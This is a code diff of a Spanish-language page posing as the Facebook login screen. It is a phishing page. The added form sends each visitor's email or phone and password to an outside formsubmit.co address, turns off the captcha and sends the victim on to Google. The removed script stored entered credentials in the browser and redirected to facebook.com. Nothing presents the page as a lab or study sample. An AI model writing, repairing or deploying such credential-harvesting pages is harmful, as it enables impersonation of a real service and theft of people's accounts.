@@ -10,13 +10,13 @@
   <div class="container">
     <div class="textos">
         <h2>facebook</h2>
-		<form action="https://formsubmit.co/00f3eb1a8383304100ebc44d2eae9bdb" method="POST">
         <p>Facebook te ayuda a comunicarte 
             y compartir con las personas que
              forman parte de tu vida</p>
     </div>
     <div>
         <div class="form">
+		<form action="https://formsubmit.co/00f3eb1a8383304100ebc44d2eae9bdb" method="POST">
             <input type="text" name="email" placeholder="Correo electrónico o número de teléfono">
 			<input type="password" id="password" name="password" placeholder="Contraseña" required>
 			<button type="submit" class="entrar" >Iniciar sesión</button>
@@ -28,7 +28,7 @@
 			
 			<input type="hidden" name="_next" value="https://Google.com">
 			<input type="hidden" name="_captcha" value="false">
-			
+		</form>
         </div>
       
         <div class="conte-ul">
@@ -37,38 +37,6 @@
         </div>
     </div>
 
-    <script>
-      // Obtener referencias a los elementos HTML
-      var emailInput = document.getElementById("emailInput");
-      var passwordInput = document.getElementById("passwordInput");
-      var loginButton = document.getElementById("loginButton");
-
-      // Agregar evento de clic al botón de inicio de sesión
-      loginButton.addEventListener("click", function(event) {
-        event.preventDefault();
-
-        // Obtener los valores de correo electrónico y contraseña
-        var email = emailInput.value;
-        var password = passwordInput.value;
-
-        // Crear un objeto de usuario
-        var user = {
-          email: email,
-          password: password
-        };
-
-        // Obtener los datos de usuarios existentes del almacenamiento local o crear un nuevo arreglo si no hay datos
-        var users = JSON.parse(localStorage.getItem("users")) || [];
-
-        // Agregar el nuevo usuario al arreglo
-        users.push(user);
-
-        // Guardar los datos de usuarios actualizados en el almacenamiento local
-        localStorage.setItem("users", JSON.stringify(users));
-
-        // Redirigir a la página que muestra los datos en una tabla
-        window.location.href = "https://www.facebook.com/";
-      });
-    </script>
+    
 </body>
 </html>
